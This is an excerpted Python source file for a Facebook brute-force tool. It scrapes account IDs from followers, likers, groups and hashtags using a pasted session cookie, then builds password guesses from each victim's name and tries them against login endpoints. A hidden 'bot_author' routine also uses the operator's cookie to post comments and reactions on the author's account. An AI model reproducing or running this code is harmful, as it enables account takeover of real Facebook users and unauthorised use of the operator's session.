...
Author    = 'Em Kay'
Facebook  = 'Facebook.com/100075307301605'
Instagram = 'Instagram.com/Emkay_smm'
Whatsapp  = '+2349036900819'
YouTube   = 'Youtube.com/channel/UCmOjVLSIjKDd0MVQ9JkD01w'
Version   = '0.6'
Denventa  = 100075307301605
Postingan = 140811348439108
...
try:
    ...
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sRecode is strictly prohibited %s!%s'%(M,P,M,P,M,P))
...
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %sThere is an error %s!%s'%(M,P,M,P,M,P))
    print('       %s• %sCannot Execute %s\n'%(M,A,error))
    print('   %s[%s•%s] %sThis Might Happen Because %s:%s'%(M,P,M,P,M,P))
    print('       %s• %sCookies/Token Invalid'%(M,A))
    print('       %s• %sIncorrectly Entered ID'%(M,A))
    print('       %s• %sBugs in the source code'%(M,A))
    print('       %s• %sBugs On Requests'%(M,A))
    print('       %s• %sEtc.\n'%(M,A))
    print('   %s[%s•%s] %sRerun This Source Code %s:%s'%(M,P,M,P,M,P))
    print('       %s• %spython omovie.py\n'%(M,A))
    exit()

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Nice on blood','You rock bro','Best tools ever','My role model']
                ...
                if ip_log != 1:pass
                    ...
                    for x in par(xyz.get('https://mbasic.facebook.com/%s?v=timeline'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Love','Care'])
...
def poster():
    l1 = ('     %s                         '%(P))
    l2 = ('     %s     %s  %s/%s   %s|  | %s      '%(J,P,J,P,J,P))
    l3 = ('     %s   %s    %s      '%(P,J,P))
    l4 = ('     %s /        %s\\%s/%s     %s     %s  %s/| | %s\\%s// %s    '%(J,P,J,P,J,P,J,P,J,P))
    l5 = ('     %s/%s    %s(%s   %s/%s  %s|%s      %s>%s   %s|  (%s    '%(J,P,J,P,J,P,J,P,J,P,J,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sEmkayxd     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s      '%(P))
    l2 = ('     %s /   %s %s/%s  %s|  | %s     '%(H,P,H,P,H,P))
    l3 = ('     %s  %s %s  '%(P,H,P))
    l4 = ('     %s /        %s\\%s/%s    %s    <%s  %s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
    l5 = ('     %s/%s %s(%s %s/%s %s|%s %s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sEmkayxd     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s        '%(P))
    l2 = ('     %s /   %s  %s/%s    %s|  | %s       '%(B,P,B,P,B,P))
    l3 = ('     %s   %s    %s      '%(P,B,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
    l5 = ('     %s/%s       %s(%s    %s/%s   %s|%s   %s>%s   %s|  (%s    '%(B,P,B,P,B,P,B,P,B,P,B,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sEmkayxd     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
...
def login():
    ...
    mkdir_data_login()
    poster()
    print('\n%s[%s•%s] %sDont Use Personal Account %s!'%(M,P,M,P,M))
    cookie = str(input('%s[%s•%s] %sEnter Cookies %s: %s'%(J,P,J,P,J,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        ...
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sNo Fucking Internet Connection %s!%s\n'%(M,P,M,P,M,P));exit()
...
def tampilan_menu():
    ...
    try:open('tool/useragent.json','r').read()
        ...
        poster2()
        print('')
        tamp_new = (f'   {P2}Hi! Looks like you are a new user. Thank you for choosing Em Kay Tools as your trusted choice. Before Using This Tool, You Must Set The User Agent First! Dont Forget To Give The Best Rating On Github (Star) Yes! thank you!\n\n              {H2}- ♥️Emkayxd♥️ -')
    ...
    try:
        ...
        user(nama)
        print(''%())
        tampilan_menu = f"""  {J2}[{A2}01{J2}] {P2}Public    {J2}[{A2}06{J2}] {P2}Comments  {J2}[{A2}11{J2}] {A2}Email
  {J2}[{A2}02{J2}] {P2}Followers {J2}[{A2}07{J2}] {P2}Group     {J2}[{A2}12{J2}] {A2}Username    
  {J2}[{A2}03{J2}] {P2}Name      {J2}[{A2}08{J2}] {P2}Hashtag   {J2}[{A2}13{J2}] {A2}Random ID   
  {J2}[{A2}04{J2}] {P2}Likers    {J2}[{A2}09{J2}] {A2}Home page {J2}[{A2}14{J2}] {A2}Friends Login 
  {J2}[{A2}05{J2}] {P2}Messages  {J2}[{A2}10{J2}] {A2}File      {J2}[{A2}15{J2}] {A2}Friends Out

       {J2}[{A2}16{J2}] {A2}Check Results       {J2}[{A2}19{J2}] {P2}User Agent
       {J2}[{A2}17{J2}] {A2}Check Options       {J2}[{A2}20{J2}] {A2}Upgrade - Pro
       {J2}[{A2}18{J2}] {A2}Check Friends       {J2}[{A2}00{J2}] {P2}Log Out"""
        printer(Panel(tampilan_menu,title=f'{J2}[ {P2}Menu {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Choose {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sNo Fucking Internet Connection %s!%s\n'%(M,P,M,P,M,P));exit()
...
def pilih_menu():
    ...
    elif dc in ['9','09','i']  : not_available('Dump ID From Home')
    elif dc in ['10','010','j']: not_available('Dump ID From File')
    elif dc in ['11','011','k']: not_available('Dump ID From Email')
    elif dc in ['12','012','l']: not_available('Dump ID From Username')
    elif dc in ['13','013','m']: not_available('Dump ID From Random ID')
    elif dc in ['14','014','n']: not_available('Dump ID From Friend Login')
    elif dc in ['15','015','o']: not_available('Dump ID From Out Friend')
    elif dc in ['16','016','p']: not_available('Check Crack Results')
    elif dc in ['17','017','q']: not_available('Check Crack Result Account Options')
    elif dc in ['18','018','r']: not_available('Check Number of Friends of Target Account')
    elif dc in ['19','019','s']: useragent('old')
    elif dc in ['20','020','t']: not_available('Upgrade To Pro Version')
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
        tamp_logout1 = (f'   {P2}Thank you for choosing Tools as your trusted choice. Dont Forget To Give The Best Rating On Github (Star) Yes! thank you!\n\n                {B2}- ♥️Emkayxd♥️ -')
        tamp_logout2 = f'''{P2}By logging out, all login data will be deleted. Here is the data to be deleted :
    {B2}• {P2}Token/Cookies
    {B2}• {P2}File Dump
    {B2}• {P2}File Tools'''
        ...
        input('\n               %s[ %sEnter To Log Out %s]'%(B,P,B))
        try:shutil.rmtree('login')
        except:pass
        try:shutil.rmtree('dump')
        except:pass
        exit('\n\n')
    else:print('\n   %s[%s•%s] %sCorrect Content %s!%s\n'%(M,P,M,P,M,P));exit()
...
def pilih_menu_user_agent():
  ...
  {J2}[{A2}02{J2}] {P2}Auto UA Switch      {J2}[{A2}05{J2}] {P2}Check Active UA
  {J2}[{A2}03{J2}] {P2}Change UA Manual    {J2}[{A2}00{J2}] {P2}Return'''
    printer(Panel(tampilan_menu_user_agent,title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Choose {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def pilih_device():
   ...
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB'''
    printer(Panel(tampilan_device,title=f'{J2}[ {P2}Device {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Choose {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
def scrap_useragent():
    data_ua = {}
    pt = 0
    pilih_device()
    ...
    try:
        ...
        printer(Panel(f'''{A2}{choice}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Successfully Replaced {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sReturn %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sRerun the Fucking Tool %s]'%(J,P,J));exit('\n')
...
def pilih_otomatis():
    ...
    try:
        pilihan = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{Choice}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}Success Replaced {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        if pengguna_source_code == 'old':input('\n   %s[ %sReturn %s]'%(J,P,J));tampilan_menu()
        else:print('\n               %s[ %sRerun the Tool %s]'%(J,P,J));exit('\n')
    except Exception as e:print('\n   %s[%s•%s] %sCorrect Content %s!%s\n'%(M,P,M,P,M,P));exit()
...
def ua_device_ini():
    ...
    try:
        ...
        manual_user_agent()
    except Exception as e:print('\n   %s[%s•%s] %sCannot Find Useragent %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);tampilan_menu()
def cek_user_agent():
    try:
        usera = open('tool/useragent.json','r').read()
        printer(Panel(f'''{A2}{user}''',title=f'{J2}[ {P2}User Agent {J2}]',subtitle=f'{J2}[ {P2}At the moment {J2}]',padding=(1,4),width=54,title_align='center',style='#FF8F00'))
        input('\n   %s[ %sReturn %s]'%(J,P,J))
        tampilan_menu()
...
def publik():
    ...
    try:
        try:
            ...
            time.sleep(3)
            login()
        print('       %s[%s•%s] %sExample : 100075307301605,1827084332'%(J,P,J,P))
        tid = input('       %s[%s•%s] %sTarget ID : %s'%(J,P,J,P,J)).split(',')
...
def main_folls():
    ...
    try:
        ...
        time.sleep(3)
        login()
    id = input('       %s[%s•%s] %sTarget ID : %s'%(J,P,J,P,J))
    ...
    print("\n       %s[%s•%s] %sSuccessfully Taken %s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def exec_folls(url,token,file):
    print("\r       %s[%s•%s] %sCurrently Taken %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
    with requests.Session() as xyz:
        try:
...
class namee:
    def __init__(self):
        ...
        print('       %s[%s•%s] %sExample : emkay,emkayxd,omovie'%(J,P,J,P))
        put = input('       %s[%s•%s] %sTarget Name : %s'%(J,P,J,P,J)).split(',')
        data = []
    ...
    def exec(self,url,cookie):
        try:
            with requests.Session() as xyz:
                ...
                if 'You are Temporarily Blocked' in spam.text:print("\r       %s[%s•%s] %sYour account has been spammed %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
                else:print("\r       %s[%s•%s] %sCurrently Taking %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
    ...
    def lanjut(self):
        print("\n       %s[%s•%s] %sSuccessfully Taken %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
...
def main_likers():
    ...
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        print('       %s[%s•%s] %sExample : 140811348439108'%(J,P,J,P))
        _query_ = input('       %s[%s•%s] %sPost ID : %s'%(J,P,J,P,J))
        print('')
    except Exception as e:kecuali(e)
    ...
    printer(Panel(tampilan_likers,title=f'{J2}[ {P2}Tipe React {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Choose {J2}]',subtitle_align='left',width=54,padding=1,style='#FF8F00'))
    rt = input('   %s└──> %s'%(A,J))
    ...
    print("\n       %s[%s•%s] %sSuccessfully Taken %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
    print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def scrape_likers(_dapunta_,_url_,_file_):
    ...
    print("\r       %s[%s•%s] %sCurrently Taken %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
    try: 
...
class message:
    def __init__(self):
        ...
        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    def exec(self,url,cookie):
        print("\r       %s[%s•%s] %sCurrently Taken %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
...
class komen:
    def __init__(self):
        ...
        try:
            cookie = {'cookie':open('login/cookie.json','r').read()}
            print('       %s[%s•%s] %sExample : 140811348439108'%(J,P,J,P))
            put = input('       %s[%s•%s] %sPosts ID : %s'%(J,P,J,P,J))
...
class grup:
    ...
    def main_grup(self,cookie):
        print('')
        tamp_grup1 = f"""            {J2}[{A2}1{J2}] {P2}Join   {J2}[{A2}2{J2}] {P2}Name   {J2}[{A2}3{J2}] {P2}ID"""
        printer(Panel(tamp_grup1,title=f'{J2}[ {P2}Group {J2}]',width=54,title_align='left',style='#FF8F00'))
        ty = input('   %s└──> %s'%(A,J))
        if ty in ['1','01','a']:
            print('')
            ...
            put = input('       %s[%s•%s] %sEnter Group Name : %s'%(J,P,J,P,J))
            print('')
            ...
            self._id_ = input('       %s[%s•%s] %sEnter Group ID : %s'%(J,P,J,P,J))
            self._pil_ = True
            print('')
                ...
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        ...
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("\r       %s[%s•%s] %sYour Account Is Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                        else:
                            self.looping += 1
                            tar = str(self.looping)
                            tamp_grup2 = f"{A2} • Group ID : {id}{dt}"
                ...
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        ...
                        if id not in open(self.file,'r').read():
                            ...
                            elif 'Anda Diblokir Sementara' in str(dt):self.looping += 1;print("\r       %s[%s•%s] %sYour Account Is Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                                tar = str(self.looping)
                                tamp_grup2 = f"{A2} • Group ID : {id}{dt}"
    ...
    def second_grup(self,cookie):
        ...
        tamp_grup3 = f"""              {J2}[{A2}1{J2}] {P2}Member ID   {J2}[{A2}2{J2}] {P2}Post ID"""
        ...
        if cuy in ['1','01','a']:
            ...
            print("\n       %s[%s•%s] %sSuccessfully Taken %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();metode();addpass();crack()
        elif cuy in ['2','02','b']:
            url_grup = 'https://mbasic.facebook.com/groups/' + pro
            self.dump_post(url_grup,cookie)
            print("\n       %s[%s•%s] %sSuccessfully Take %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            system_login();metode();addpass();crack()
        else:print('\n   %s[%s•%s] %sCorrect Content %s!%s\n'%(M,P,M,P,M,P));exit()
    def dump_member(self,url,cookie):
        print("\r       %s[%s•%s] %sCurrently Taken %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
...
class hashtag:
    def __init__(self):
        ...
        xd = input('       %s[%s•%s] %sSearch Hashtags : %s'%(J,P,J,P,J)).replace(' ','')
...
def system_login():
    ...
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}Method {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
...
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}Old ID    {J2}[{A2}2{J2}] {P2}Young ID  {J2}[{A2}3{J2}] {P2}Random ID"""
    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}Order {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    ...
    if SAKERA != 159403:
        ...
        try:
            ...
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"12")
                else:listpass.append(nd);listpass.append(nd+"12")
                if pp in ['',' ','  ']:pass
                else:
                ...
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:listpass.append(nd+"12");listpass.append(nd+"123");listpass.append(nd+"12345")
                else:listpass.append(nd);listpass.append(nd+"12");listpass.append(nd+"123");listpass.append(nd+"12345")
                nb = na[-1].lower()
                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:listpass.append(nb+"12");listpass.append(nd+"123");listpass.append(nd+"12345")
                else:listpass.append(nb);listpass.append(nb+"12");listpass.append(nd+"123");listpass.append(nd+"12345")
                if pp in ['',' ','  ']:pass
                else:
...
def addpass():
    ...
    print('')
    print('   %s[%s•%s] %sManual Pass %s[ %sAlphabec %s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s•%s] %sManual Pass %s[ %sNumeric %s]'%(J,P,J,P,J,A,J))
        ...
        with requests.Session() as xyz:
            ...
            for hhh1 in par1.find_all('h3'):
                if 'Ditambahkan' in hhh1.text:
                    ingfo1 = '\n      ⟶  '+str(hhh1.text).replace('Added on ',' [') + ']'
                    ingfo1 = ('\n      %s⟶  %s%s]'%(H,P,str(hhh1.text).replace('Added on ',' [')))
        ...
        with requests.Session() as xyz:
            ...
            for hhh2 in par2.find_all('h3'):
                if 'Kedaluwarsa' in hhh2.text:
                    ingfo2 = '\n      ⟶  '+str(hhh2.text).replace('Expired on ',' [') + ']'
                    ingfo2 = ('\n      %s⟶  %s%s]'%(J,P,str(hhh2.text).replace('Expired on ',' [')))
        ...
        with requests.Session() as xyz:
            ...
            for hhh3 in par3.find_all('h3'):
                if 'Dihapus' in hhh3.text:
                    ingfo3 = '\n      ⟶  %s'+str(hhh3.text).replace('Removed: ',' [') + ']'
                    ingfo3 = ('\n      %s⟶  %s%s]'%(M,P,str(hhh3.text).replace('Removed: ',' [')))
...
class crack:
    ...
    def start_crack(self,list):
        try:
            for pw in list['pw']:
                if sistem_login   == 'one' : log = logger1(list['id'],pw)
                elif sistem_login == 'two'  : log = logger2(list['id'],pw)
                elif sistem_login == 'three' : log = logger3(list['id'],pw)
...
def not_available(konten):
    print('')
    tamp_kesediaan = (f'   {P2}Sorry dude, the {konten} feature is currently not available. Wait for the next update to use the upcoming features. Thank you.\n\n                {M2}- Emkayxd -')
    printer(Panel(tamp_kesediaan,title=f'{M2}[  {P2}Coming  Soon  {M2}]',title_align='center',subtitle=f'{M2}[  {P2}See  You  Soon  {M2}]',subtitle_align='center',width=54,padding=(1,4),style='#FF0000'))
    input('\n\n               %s[ %sBack to Home Menu %s]              '%(H,P,H))
    tampilan_menu()
